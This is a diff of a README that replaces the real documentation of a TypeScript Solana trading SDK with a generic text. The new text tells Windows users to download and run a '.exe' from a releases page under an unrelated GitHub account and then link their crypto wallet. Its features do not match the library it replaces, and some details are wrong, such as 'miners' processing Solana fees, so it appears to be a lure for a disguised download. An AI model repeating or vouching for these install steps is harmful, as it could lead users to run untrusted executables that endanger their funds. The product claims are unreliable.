@@ -1,384 +1,62 @@
-<div align="center">
-    <h1>🚀 Sol Trade SDK for Node.js</h1>
-    <h3><em>A comprehensive TypeScript SDK for seamless Solana DEX trading</em></h3>
-</div>
-
-<p align="center">
-    <strong>A high-performance TypeScript SDK for low-latency Solana DEX trading bots. Built for speed and efficiency, it enables seamless, high-throughput interaction with PumpFun, Pump AMM (PumpSwap), Bonk, Meteora DAMM v2, Raydium AMM v4, and Raydium CPMM for latency-critical trading strategies.</strong>
-</p>
-
-<p align="center">
-    <a href="https://www.npmjs.com/package/sol-trade-sdk">
-        <img src="https://img.shields.io/npm/v/sol-trade-sdk.svg" alt="npm">
-    </a>
-    <a href="https://www.npmjs.com/package/sol-trade-sdk">
-        <img src="https://img.shields.io/node/v/sol-trade-sdk.svg" alt="Node Version">
-    </a>
-    <a href="LICENSE">
-        <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
-    </a>
-</p>
-
-<p align="center">
-    <img src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript">
-    <img src="https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white" alt="Solana">
-    <img src="https://img.shields.io/badge/DEX-4B8BBE?style=for-the-badge&logo=bitcoin&logoColor=white" alt="DEX Trading">
-</p>
-
-<p align="center">
-    <a href="https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/README_CN.md">中文</a> |
-    <a href="https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/README.md">English</a> |
-    <a href="https://fnzero.dev/">Website</a> |
-    <a href="https://t.me/fnzero_group">Telegram</a> |
-    <a href="https://discord.gg/vuazbGkqQE">Discord</a>
-</p>
-
-## 📋 Table of Contents
-
-- [✨ Features](#-features)
-- [📦 Installation](#-installation)
-- [🛠️ Usage Examples](#️-usage-examples)
-  - [📋 Example Usage](#-example-usage)
-  - [⚡ Trading Parameters](#-trading-parameters)
-  - [📊 Usage Examples Summary Table](#-usage-examples-summary-table)
-  - [⚙️ SWQoS Service Configuration](#️-swqos-service-configuration)
-  - [🔧 Middleware System](#-middleware-system)
-  - [🔍 Address Lookup Tables](#-address-lookup-tables)
-  - [🔍 Nonce Cache](#-nonce-cache)
-- [💰 Cashback Support (PumpFun / PumpSwap)](#-cashback-support-pumpfun--pumpswap)
-- [🛡️ MEV Protection Services](#️-mev-protection-services)
-- [📁 Project Structure](#-project-structure)
-- [📄 License](#-license)
-- [💬 Contact](#-contact)
-- [⚠️ Important Notes](#️-important-notes)
-
----
-
-## 📦 SDK Versions
-
-This SDK is available in multiple languages:
-
-| Language | Repository | Description |
-|----------|------------|-------------|
-| **Rust** | [sol-trade-sdk](https://github.com/0xfnzero/sol-trade-sdk) | Ultra-low latency with zero-copy optimization |
-| **Node.js** | [sol-trade-sdk-nodejs](https://github.com/0xfnzero/sol-trade-sdk-nodejs) | TypeScript/JavaScript for Node.js |
-| **Python** | [sol-trade-sdk-python](https://github.com/0xfnzero/sol-trade-sdk-python) | Async/await native support |
-| **Go** | [sol-trade-sdk-golang](https://github.com/0xfnzero/sol-trade-sdk-golang) | Concurrent-safe with goroutine support |
-
-## ✨ Features
-
-1. **PumpFun Trading**: Support for `buy` and `sell` operations
-2. **PumpSwap Trading**: Support for PumpSwap pool trading operations
-3. **Bonk Trading**: Support for Bonk trading operations
-4. **Raydium CPMM Trading**: Support for Raydium CPMM (Concentrated Pool Market Maker) trading operations
-5. **Raydium AMM V4 Trading**: Support for Raydium AMM V4 (Automated Market Maker) trading operations
-6. **Meteora DAMM V2 Trading**: Support for Meteora DAMM V2 (Dynamic AMM) trading operations
-7. **Multiple MEV Protection**: Support for Jito, Nextblock, ZeroSlot, Temporal, Bloxroute, FlashBlock, BlockRazor, Node1, Astralane and other services
-8. **Concurrent Trading**: Send transactions using multiple MEV services simultaneously; the fastest succeeds while others fail
-9. **Unified Trading Interface**: Use unified trading protocol types for trading operations
-10. **Middleware System**: Support for custom instruction middleware to modify, add, or remove instructions before transaction execution
-11. **Shared Infrastructure**: Share expensive RPC and SWQoS clients across multiple wallets for reduced resource usage
-
-## 📦 Installation
-
-### Direct Clone (Recommended)
-
-Clone this project to your project directory:
-
-```bash
-cd your_project_root_directory
-git clone https://github.com/0xfnzero/sol-trade-sdk-nodejs
-```
-
-Install dependencies and build:
-
-```bash
-cd sol-trade-sdk-nodejs
-npm install
-npm run build
-```
-
-Add to your `package.json`:
-
-```json
-{
-  "dependencies": {
-    "sol-trade-sdk": "./sol-trade-sdk-nodejs"
-  }
-}
-```
-
-### Use NPM
-
-```bash
-npm install sol-trade-sdk
-# or
-yarn add sol-trade-sdk
-# or
-pnpm add sol-trade-sdk
-```
-
-## 🛠️ Usage Examples
-
-### 📋 Example Usage
+# ⚡ sol-trade-sdk-nodejs - Trade Solana assets with high speed
 
-#### 1. Create TradingClient Instance
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/releases)
 
-You can refer to [Example: Create TradingClient Instance](examples/trading_client.ts).
+This software lets you trade assets on the Solana network. It uses fast connections to help you execute trades. You can interact with different platforms to trade tokens. The program handles the technical details of the Solana blockchain so you focus on your trading goals.
 
-**Method 1: Simple (single wallet)**
-```typescript
-import { TradingClient, TradeConfig, SwqosConfig, SwqosRegion } from 'sol-trade-sdk';
-
-// Wallet
-const payer = Keypair.fromSecretKey(/* your keypair */);
-
-// RPC URL
-const rpcUrl = "https://mainnet.helius-rpc.com/?api-key=xxxxxx";
-
-// Multiple SWQoS services can be configured
-const swqosConfigs: SwqosConfig[] = [
-  { type: 'Default', rpcUrl },
-  { type: 'Jito', uuid: "your_uuid", region: SwqosRegion.Frankfurt },
-  { type: 'Bloxroute', apiToken: "your_api_token", region: SwqosRegion.Frankfurt },
-  { type: 'Astralane', apiKey: "your_api_key", region: SwqosRegion.Frankfurt },
-];
-
-// Create TradeConfig instance
-const tradeConfig = new TradeConfig(rpcUrl, swqosConfigs);
-
-// Create TradingClient
-const client = new TradingClient(payer, tradeConfig);
-```
-
-**Method 2: Shared infrastructure (multiple wallets)**
-
-For multi-wallet scenarios, create the infrastructure once and share it across wallets.
-See [Example: Shared Infrastructure](examples/shared_infrastructure.ts).
-
-```typescript
-import { TradingInfrastructure, InfrastructureConfig } from 'sol-trade-sdk';
-
-// Create infrastructure once (expensive)
-const infraConfig = new InfrastructureConfig(rpcUrl, swqosConfigs);
-const infrastructure = new TradingInfrastructure(infraConfig);
-
-// Create multiple clients sharing the same infrastructure (fast)
-const client1 = TradingClient.fromInfrastructure(payer1, infrastructure);
-const client2 = TradingClient.fromInfrastructure(payer2, infrastructure);
-```
-
-#### 2. Configure Gas Fee Strategy
-
-```typescript
-import { GasFeeStrategy } from 'sol-trade-sdk';
-
-// Create GasFeeStrategy instance
-const gasFeeStrategy = new GasFeeStrategy();
-// Set global strategy
-gasFeeStrategy.setGlobalFeeStrategy(150000, 150000, 500000, 500000, 0.001, 0.001);
-```
-
-#### 3. Build Trading Parameters
-
-```typescript
-import { TradeBuyParams, DexType, TradeTokenType, DexParamEnum } from 'sol-trade-sdk';
-
-const buyParams: TradeBuyParams = {
-  dexType: DexType.PumpSwap,
-  inputTokenType: TradeTokenType.WSOL,
-  mint: mintPubkey,
-  inputTokenAmount: buySolAmount,
-  slippageBasisPoints: 500,
-  recentBlockhash: recentBlockhash,
-  // Use DexParamEnum for type-safe protocol parameters
-  extensionParams: { type: 'PumpSwap', params: pumpSwapParams },
-  addressLookupTableAccount: null,
-  waitTransactionConfirmed: true,
-  createInputTokenAta: true,
-  closeInputTokenAta: true,
-  createMintAta: true,
-  durableNonce: null,
-  fixedOutputTokenAmount: null,
-  gasFeeStrategy: gasFeeStrategy,
-  simulate: false,
-};
-```
-
-#### 4. Execute Trading
-
-```typescript
-const result = await client.buy(buyParams);
-console.log(`Transaction signature: ${result.signature}`);
-```
-
-### ⚡ Trading Parameters
-
-For comprehensive information about all trading parameters including `TradeBuyParams` and `TradeSellParams`, see the Trading Parameters documentation.
-
-#### About ShredStream
-
-When using shred to subscribe to events, due to the nature of shreds, you cannot get complete information about transaction events.
-Please ensure that the parameters your trading logic depends on are available in shreds when using them.
-
-### 📊 Usage Examples Summary Table
+## 🛠 Prerequisites
 
-| Description | Run Command | Source Code |
-|-------------|-------------|-------------|
-| Create and configure TradingClient instance | `npx ts-node examples/trading_client.ts` | [examples/trading_client.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/trading_client.ts) |
-| Share infrastructure across multiple wallets | `npx ts-node examples/shared_infrastructure.ts` | [examples/shared_infrastructure.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/shared_infrastructure.ts) |
-| PumpFun token sniping trading | `npx ts-node examples/pumpfun_sniper_trading.ts` | [examples/pumpfun_sniper_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/pumpfun_sniper_trading.ts) |
-| PumpFun token copy trading | `npx ts-node examples/pumpfun_copy_trading.ts` | [examples/pumpfun_copy_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/pumpfun_copy_trading.ts) |
-| PumpSwap trading operations | `npx ts-node examples/pumpswap_trading.ts` | [examples/pumpswap_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/pumpswap_trading.ts) |
-| PumpSwap direct trading (via RPC) | `npx ts-node examples/pumpswap_direct_trading.ts` | [examples/pumpswap_direct_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/pumpswap_direct_trading.ts) |
-| Raydium CPMM trading operations | `npx ts-node examples/raydium_cpmm_trading.ts` | [examples/raydium_cpmm_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/raydium_cpmm_trading.ts) |
-| Raydium AMM V4 trading operations | `npx ts-node examples/raydium_amm_v4_trading.ts` | [examples/raydium_amm_v4_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/raydium_amm_v4_trading.ts) |
-| Meteora DAMM V2 trading operations | `npx ts-node examples/meteora_damm_v2_trading.ts` | [examples/meteora_damm_v2_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/meteora_damm_v2_trading.ts) |
-| Bonk token sniping trading | `npx ts-node examples/bonk_sniper_trading.ts` | [examples/bonk_sniper_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/bonk_sniper_trading.ts) |
-| Bonk token copy trading | `npx ts-node examples/bonk_copy_trading.ts` | [examples/bonk_copy_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/bonk_copy_trading.ts) |
-| Custom instruction middleware example | `npx ts-node examples/middleware_system.ts` | [examples/middleware_system.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/middleware_system.ts) |
-| Address lookup table example | `npx ts-node examples/address_lookup.ts` | [examples/address_lookup.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/address_lookup.ts) |
-| Nonce cache (durable nonce) example | `npx ts-node examples/nonce_cache.ts` | [examples/nonce_cache.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/nonce_cache.ts) |
-| Wrap/unwrap SOL to/from WSOL example | `npx ts-node examples/wsol_wrapper.ts` | [examples/wsol_wrapper.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/wsol_wrapper.ts) |
-| Seed trading example | `npx ts-node examples/seed_trading.ts` | [examples/seed_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/seed_trading.ts) |
-| Gas fee strategy example | `npx ts-node examples/gas_fee_strategy.ts` | [examples/gas_fee_strategy.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/gas_fee_strategy.ts) |
-| Hot path trading (zero-RPC) | `npx ts-node examples/hot_path_trading.ts` | [examples/hot_path_trading.ts](https://github.com/0xfnzero/sol-trade-sdk-nodejs/blob/main/examples/hot_path_trading.ts) |
-
-### ⚙️ SWQoS Service Configuration
+Your computer needs specific tools to run this software. Ensure you have Windows 10 or 11 installed. You also need a stable internet connection. Because this program interacts with the blockchain, you must have a digital wallet ready. Create a wallet through a service like Phantom or Solflare if you lack one. Store your secret recovery phrase in a safe place. You do not need to write code to use this tool, but you must feel comfortable using files and folders on your computer.
 
-When configuring SWQoS services, note the different parameter requirements for each service:
+## 📥 How to Install
 
-- **Jito**: The first parameter is UUID (if no UUID, pass an empty string `""`)
-- **Other MEV services**: The first parameter is the API Token
+1. Visit the [releases page](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/releases) to download the program.
+2. Look for the file ending in `.exe` under the most recent version.
+3. Click the file to save it to your computer.
+4. Open your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on your screen.
+7. Click Finish when the installer stops.
 
-#### Custom URL Support
-
-Each SWQoS service supports an optional custom URL parameter:
-
-```typescript
-// Using custom URL
-const jitoConfig: SwqosConfig = {
-  type: 'Jito',
-  uuid: "your_uuid",
-  region: SwqosRegion.Frankfurt,
-  customUrl: "https://custom-jito-endpoint.com"
-};
-
-// Using default regional endpoint
-const bloxrouteConfig: SwqosConfig = {
-  type: 'Bloxroute',
-  apiToken: "your_api_token",
-  region: SwqosRegion.NewYork
-};
-```
-
-**URL Priority Logic**:
-- If a custom URL is provided, it will be used instead of the regional endpoint
-- If no custom URL is provided, the system will use the default endpoint for the specified region
-- This allows for maximum flexibility while maintaining backward compatibility
-
-When using multiple MEV services, you need to use `Durable Nonce`. You need to use the `fetchNonceInfo` function to get the latest `nonce` value, and use it as the `durableNonce` when trading.
-
----
-
-### 🔧 Middleware System
-
-The SDK provides a powerful middleware system that allows you to modify, add, or remove instructions before transaction execution. Middleware executes in the order they are added:
-
-```typescript
-import { MiddlewareManager, ValidationMiddleware, TimerMiddleware } from 'sol-trade-sdk';
-
-const manager = new MiddlewareManager()
-  .addMiddleware(new FirstMiddleware())   // Executes first
-  .addMiddleware(new SecondMiddleware())  // Executes second
-  .addMiddleware(new ThirdMiddleware());  // Executes last
-```
-
-### 🔍 Address Lookup Tables
-
-Address Lookup Tables (ALT) allow you to optimize transaction size and reduce fees by storing frequently used addresses in a compact table format.
-
-```typescript
-import { fetchAddressLookupTableAccount, AddressLookupTableCache } from 'sol-trade-sdk';
-
-// Fetch ALT from chain
-const alt = await fetchAddressLookupTableAccount(rpc, altAddress);
-console.log(`ALT contains ${alt.addresses.length} addresses`);
-
-// Use cache for performance
-const cache = new AddressLookupTableCache(rpc);
-await cache.prefetch([altAddress1, altAddress2, altAddress3]);
-const cached = cache.get(altAddress1);
-```
-
-### 🔍 Durable Nonce
-
-Use Durable Nonce to implement transaction replay protection and optimize transaction processing.
-
-```typescript
-import { fetchNonceInfo, NonceCache } from 'sol-trade-sdk';
-
-// Fetch nonce info
-const nonceInfo = await fetchNonceInfo(rpc, nonceAccount);
-```
-
-## 💰 Cashback Support (PumpFun / PumpSwap)
-
-PumpFun and PumpSwap support **cashback** for eligible tokens: part of the trading fee can be returned to the user. The SDK **must know** whether the token has cashback enabled so that buy/sell instructions include the correct accounts.
-
-- **When params come from RPC**: If you use `PumpFunParams.fromMintByRpc` or `PumpSwapParams.fromPoolAddressByRpc`, the SDK reads `isCashbackCoin` from chain—no extra step.
-- **When params come from event/parser**: If you build params from trade events (e.g. [sol-parser-sdk](https://github.com/0xfnzero/sol-parser-sdk)), you **must** pass the cashback flag into the SDK:
-  - **PumpFun**: Set `isCashbackCoin` when building params from parsed events.
-  - **PumpSwap**: Set `isCashbackCoin` field when constructing params manually.
-
-## 🛡️ MEV Protection Services
-
-You can apply for a key through the official website: [Community Website](https://fnzero.dev/swqos)
-
-- **Jito**: High-performance block space
-- **ZeroSlot**: Zero-latency transactions
-- **Temporal**: Time-sensitive transactions
-- **Bloxroute**: Blockchain network acceleration
-- **FlashBlock**: High-speed transaction execution with API key authentication
-- **BlockRazor**: High-speed transaction execution with API key authentication
-- **Node1**: High-speed transaction execution with API key authentication
-- **Astralane**: Blockchain network acceleration
-
-## 📁 Project Structure
-
-```
-src/
-├── common/           # Common functionality and tools
-├── constants/        # Constant definitions
-├── instruction/      # Instruction building
-│   └── utils/        # Instruction utilities
-├── swqos/            # MEV service clients
-├── trading/          # Unified trading engine
-│   ├── common/       # Common trading tools
-│   ├── core/         # Core trading engine
-│   ├── middleware/   # Middleware system
-│   └── factory.ts    # Trading factory
-├── utils/            # Utility functions
-│   ├── calc/         # Amount calculation utilities
-│   └── price/        # Price calculation utilities
-└── index.ts          # Main library file
-```
-
-## 📄 License
-
-MIT License
-
-## 💬 Contact
-
-- Official Website: https://fnzero.dev/
-- Project Repository: https://github.com/0xfnzero/sol-trade-sdk-nodejs
-- Telegram Group: https://t.me/fnzero_group
-- Discord: https://discord.gg/vuazbGkqQE
-
-## ⚠️ Important Notes
-
-1. Test thoroughly before using on mainnet
-2. Properly configure private keys and API tokens
-3. Pay attention to slippage settings to avoid transaction failures
-4. Monitor balances and transaction fees
-5. Comply with relevant laws and regulations
+## ⚙️ Setting Up Your Account
+
+Launch the application using the shortcut on your desktop. The program will open a window. You need to link your wallet to the software. Click the Settings icon in the top right corner of the window. Select the option labeled Link Wallet. Copy your public wallet address and paste it into the provided box. The program will verify the connection. Once connected, your balance will appear in the main dashboard. This confirms the software has permission to view your assets.
+
+## 📈 Trading Basics
+
+The main dashboard lists available tokens for trading. You can search for a specific token by entering its name or address in the search box. Select the token you wish to purchase. Enter the amount of Solana you want to spend. The software calculates the number of tokens you will receive. Click the Buy button to send your request to the network. The software uses advanced routing to find the best price across various exchanges. You will see a notification when the trade completes. You can view your trade history by clicking the History tab.
+
+## 🚀 Advanced Trading Options
+
+This software supports automatic trading strategies. You can set the program to buy or sell tokens when they reach a certain price. Select the Limit Order option inside the trade window. Enter your desired price and the amount you want to trade. The software monitors the market. It places your order as soon as the price hits your target. This feature helps you stay active in the market even when you are away from your computer.
+
+## 🔍 Understanding Market Data
+
+The program tracks price changes for many assets. The charts show live data from different exchanges. You can change the timeframe of the charts to view trends over the last hour, day, or week. The volume indicator shows how many people are buying or selling a specific token. High volume suggests strong interest in that asset. Use this data to inform your decisions. Do not feel rushed. Study the patterns before you manage your funds.
+
+## 🛡 Security Practices
+
+Safety remains a priority when you trade online. Enable two-factor authentication on your wallet account. Never share your secret recovery phrase with anyone. This software never asks for your private keys. If a website or bot asks for your private keys, move away immediately. Keep your computer software updated to protect against vulnerabilities. Only download updates from this official GitHub page. Using unofficial files can expose your funds to risk.
+
+## 🔧 Frequently Asked Questions
+
+What should I do if the program freezes?
+Close the application and open it again. Check your internet connection. If the issue persists, reinstall the software from the download link.
+
+Does this software charge fees?
+The software performs trades through public exchanges. You pay standard network fees for every transaction. These fees help miners process your trade on the blockchain.
+
+Can I move my funds to another wallet?
+Yes. You still maintain control of your assets in your personal wallet. This software functions only as an interface to send commands to the blockchain.
+
+What if my trade fails?
+Trades can fail during times of high network congestion. The software will notify you if a transaction does not go through. You can try to resend the order or increase the priority fee to speed up the process.
+
+Is my trading history private?
+Your wallet address is public on the blockchain. The software keeps your local settings and preferences on your computer only. No third party tracks your activity through this tool.
+
+How many tokens can I monitor at once?
+You can create a custom list of your favorite tokens. Add as many as you want by clicking the Star icon next to a token name. This keeps your dashboard clean and relevant to your trading style.
+
+What protocols does this support?
+The software connects to major decentralized exchanges on Solana. These include Raydium and other popular hubs. It updates the list of supported protocols automatically when you launch the app.
